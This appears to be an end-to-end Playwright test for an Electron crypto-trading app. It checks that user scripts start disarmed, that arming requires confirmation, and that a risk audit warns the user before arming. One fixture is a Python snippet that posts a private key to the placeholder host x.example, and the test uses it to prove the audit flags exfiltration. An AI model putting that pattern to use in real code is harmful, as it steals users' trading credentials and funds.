/**
 * E2E: the money-critical script UI.
 *
 * Everything else about a script is recoverable. These flows decide whether
 * user code is allowed to spend real money, so they are covered here rather
 * than left to the Python tests (which cannot see the renderer at all):
 *
 *   - a new script is SHADOW + disabled, never armed by default
 *   - arming requires an explicit confirmation; cancelling does not arm
 *   - DISarming is immediate (risk-off must never need a confirmation)
 *   - code that fails validation cannot be armed
 *   - the risk audit runs and its findings reach the arm confirmation
 *   - the master "Scripts live" switch is off out of the box
 *
 * Runs against the BUILT renderer (`npm run build` first) in a fully isolated
 * profile — userData, APPDATA and LOCALAPPDATA are all redirected, because the
 * settings vault lives outside userData and would otherwise pull in (and
 * overwrite) the real one. See .claude/skills/run-app/SKILL.md.
 */
import { _electron as electron } from 'playwright-core';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';

const APP_DIR = path.resolve(import.meta.dirname, '..');
const SANDBOX = fs.mkdtempSync(path.join(os.tmpdir(), 'krypt-e2e-'));
const userData = path.join(SANDBOX, 'userData');
const APPDATA = path.join(SANDBOX, 'Roaming');
const LOCALAPPDATA = path.join(SANDBOX, 'Local');
for (const d of [userData, APPDATA, LOCALAPPDATA]) fs.mkdirSync(d, { recursive: true });

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const failures = [];
let passed = 0;

function check(label, cond, extra = '') {
  if (cond) { passed++; console.log(`  ok   ${label}`); }
  else { failures.push(label); console.log(`  FAIL ${label}${extra ? '  — ' + extra : ''}`); }
}

const VALID = [
  '# krypt-script v1',
  '# name: E2E Arming Fixture',
  '',
  'def decide(ctx):',
  '    return None',
  '',
].join('\n');

if (!fs.existsSync(path.join(APP_DIR, 'dist', 'index.html'))) {
  console.error('dist/index.html missing — run `npm run build` first.');
  process.exit(1);
}

const app = await electron.launch({
  executablePath: path.join(APP_DIR, 'node_modules', 'electron', 'dist',
    process.platform === 'win32' ? 'electron.exe' : 'electron'),
  args: [APP_DIR, `--user-data-dir=${userData}`],
  cwd: APP_DIR,
  env: { ...process.env, APPDATA, LOCALAPPDATA },
  timeout: 90_000,
});

try {
  const page = await app.firstWindow({ timeout: 60_000 });
  await page.waitForLoadState('domcontentloaded');
  const consoleErrors = [];
  page.on('console', (m) => { if (m.type() === 'error') consoleErrors.push(m.text()); });
  await sleep(10_000);                       // backend handshake

  // A fresh profile always shows onboarding; it covers the whole UI.
  for (let i = 0; i < 10; i++) {
    const r = await page.evaluate(() => {
      const m = document.querySelector('.fixed.inset-0');
      if (!m) return 'GONE';
      let t = 0;
      for (const cb of m.querySelectorAll('input[type=checkbox], [role=checkbox]')) {
        const on = cb.checked ?? cb.getAttribute('aria-checked') === 'true';
        if (!on) { cb.click(); t++; }
      }
      if (t) return 'TICK';
      // Short labels only: the choice cards are buttons too.
      const b = [...m.querySelectorAll('button')].find((x) =>
        (x.textContent || '').trim().length <= 24
        && /continue|next|get started|start on paper|accept|agree|finish|done/i.test(x.textContent || ''));
      if (!b) return 'NO_BUTTON';
      b.click();
      return 'CLICK';
    });
    if (r === 'GONE' || r === 'NO_BUTTON') break;
    await sleep(800);
  }
  await sleep(800);
  // Left open, it is the first modal in the DOM and every modal check below would
  // read its text instead ("API key" is in its title).
  const stuck = await page.evaluate(() => document.querySelector('.fixed.inset-0')?.innerText ?? '');
  if (stuck) throw new Error(`onboarding did not close: ${stuck.slice(0, 120)}`);

  /** Click a control by its label. THROWS when the control isn't there —
   *  a silent miss would let later assertions pass vacuously (e.g. "cancelling
   *  leaves it in shadow" is trivially true if Cancel was never clicked). */
  const clickText = async (t) => {
    const hit = await page.evaluate((txt) => {
      // Skips the header's Paper | Live switch: this spec means the script's own
      // Shadow | Live pill, and the header's button comes first in the page.
      const els = [...document.querySelectorAll('button, a, [role="button"]')]
        .filter((e) => !e.closest('[data-testid="account-mode-switch"]'));
      const el = els.find((e) => (e.textContent || '').trim() === txt)
              ?? els.find((e) => (e.textContent || '').includes(txt));
      if (!el) return false;
      el.click();
      return true;
    }, t);
    if (!hit) throw new Error(`control not found: ${JSON.stringify(t)}`);
    return true;
  };

  const modalText = () => page.evaluate(
    () => document.querySelector('.fixed.inset-0')?.innerText ?? '');

  // The renderer's own view of the selected script — the assertion surface.
  const sel = () => page.evaluate(async () => {
    const r = await window.krypt.scripts.list();
    return r.scripts[0] ?? null;
  });

  // A fresh profile lands in SIMPLE mode (5-page shell, no Scripts entry).
  // Assert that default, then flip the TopBar toggle to Advanced to reach
  // the cockpit this suite exercises.
  console.log('\nui mode');
  const mode = await page.evaluate(async () => (await window.krypt.state.get())?.uiMode);
  check('fresh profile starts in Simple mode', mode === 'simple', `got ${mode}`);
  await clickText('Advanced');
  await sleep(1000);

  await clickText('Scripts');
  await sleep(2000);

  console.log('\nmaster switch');
  const cfg = await page.evaluate(async () =>
    (await window.krypt.state.get())?.config?.scriptsLiveEnabled);
  check('"Scripts live" is OFF out of the box', cfg === false, `got ${cfg}`);

  console.log('\ndefaults for a new script');
  await clickText('New script');
  await sleep(2500);
  let s = await sel();
  check('a script was created', !!s);
  check('starts in SHADOW (dryRun)', s?.dryRun === true, `dryRun=${s?.dryRun}`);
  check('starts DISABLED', s?.enabled === false, `enabled=${s?.enabled}`);
  check('the template passes the risk audit clean', s?.audit?.ok === true,
    JSON.stringify(s?.audit?.findings?.slice(0, 2) || []));
  check('starts scoped to every coin', s?.assets === null, `assets=${JSON.stringify(s?.assets)}`);
  check('status says it is not enabled', s?.status?.state === 'off',
    `state=${s?.status?.state} detail=${s?.status?.detail}`);

  console.log('\narming requires confirmation');
  await clickText('Shadow');                 // the shadow/live pill
  await sleep(900);
  const armModal = await modalText();
  check('a confirmation modal opens', /arm for real orders/i.test(armModal),
    armModal.slice(0, 60).replace(/\n/g, ' '));
  check('modal warns about real money', /real money/i.test(armModal));
  check('modal discloses the exits caveat', /exit/i.test(armModal));
  s = await sel();
  check('opening the modal does NOT arm it', s?.dryRun === true, `dryRun=${s?.dryRun}`);

  await clickText('Cancel');
  await sleep(800);
  s = await sel();
  check('cancelling leaves it in shadow', s?.dryRun === true, `dryRun=${s?.dryRun}`);

  console.log('\narming, then disarming');
  await clickText('Shadow');
  await sleep(800);
  await clickText('Arm for real orders');
  await sleep(1500);
  s = await sel();
  check('confirming arms it', s?.dryRun === false, `dryRun=${s?.dryRun}`);

  // Risk-OFF must be one click: never gate the safe direction behind a dialog.
  await clickText('Live');
  await sleep(1500);
  s = await sel();
  check('disarming is immediate, no confirmation', s?.dryRun === true, `dryRun=${s?.dryRun}`);
  const afterDisarm = await modalText();
  check('no modal was opened to disarm', afterDisarm === '', afterDisarm.slice(0, 200).replace(/\s+/g, ' '));

  console.log('\ninvalid code cannot be armed');
  await page.evaluate(async (code) => {
    const r = await window.krypt.scripts.list();
    await window.krypt.scripts.save({ id: r.scripts[0].id, code });
  }, 'def decide(ctx)\n    return None\n');   // syntax error: cannot load
  await sleep(1200);
  const refused = await page.evaluate(async () => {
    const r = await window.krypt.scripts.list();
    try {
      await window.krypt.scripts.setDryRun(r.scripts[0].id, false);
      return 'ALLOWED';
    } catch (e) { return 'REFUSED: ' + String(e?.message || e); }
  });
  check('backend refuses to arm code that fails validation',
    refused.startsWith('REFUSED'), refused.slice(0, 80));
  s = await sel();
  check('script stayed in shadow after the refusal', s?.dryRun === true);

  // The risk audit is what replaced the language sandbox. Scripts are full
  // Python now, so the app's remaining defence is telling the user what the
  // code does — and it only counts if that reaches them BEFORE they arm it.
  console.log('\nthe risk audit reaches the user before they arm');
  await page.evaluate(async (code) => {
    const r = await window.krypt.scripts.list();
    await window.krypt.scripts.save({ id: r.scripts[0].id, code });
  }, [
    'import requests',
    'import polymarket_auth',
    'def decide(ctx):',
    '    requests.post("https://x.example", json=polymarket_auth.private_key)',
    '    return None',
    '',
  ].join('\n'));
  await sleep(1500);
  s = await sel();
  check('audit flags an exfiltration-shaped script', s?.audit?.ok === false,
    JSON.stringify(s?.audit || {}).slice(0, 120));
  check('audit names the credentials+network combination',
    (s?.audit?.categories || []).includes('exfiltration'),
    JSON.stringify(s?.audit?.categories || []));

  await clickText('Shadow');                 // open the arm confirmation
  await sleep(1000);
  const riskModal = await modalText();
  check('the arm modal surfaces the audit', /risk audit flagged/i.test(riskModal),
    riskModal.slice(0, 120).replace(/\n/g, ' '));
  check('the arm modal names the API-key risk', /API key/i.test(riskModal));
  s = await sel();
  check('opening it does NOT arm the flagged script', s?.dryRun === true,
    `dryRun=${s?.dryRun}`);
  await clickText('Cancel');
  await sleep(700);

  // Restore clean code so the run ends on a known-good script.
  await page.evaluate(async (code) => {
    const r = await window.krypt.scripts.list();
    await window.krypt.scripts.save({ id: r.scripts[0].id, code });
  }, VALID);
  await sleep(1200);

  console.log('\nhealth');
  check('no renderer console errors', consoleErrors.length === 0,
    consoleErrors.slice(0, 2).join(' | ').slice(0, 160));
} catch (e) {
  failures.push('driver error: ' + e.message);
  console.log('\nDRIVER ERROR:', e.message);
} finally {
  await app.close().catch(() => {});
  fs.rmSync(SANDBOX, { recursive: true, force: true });
}

console.log(`\n${passed} passed, ${failures.length} failed`);
if (failures.length) {
  for (const f of failures) console.log('  FAILED:', f);
  process.exit(1);
}
process.exit(0);
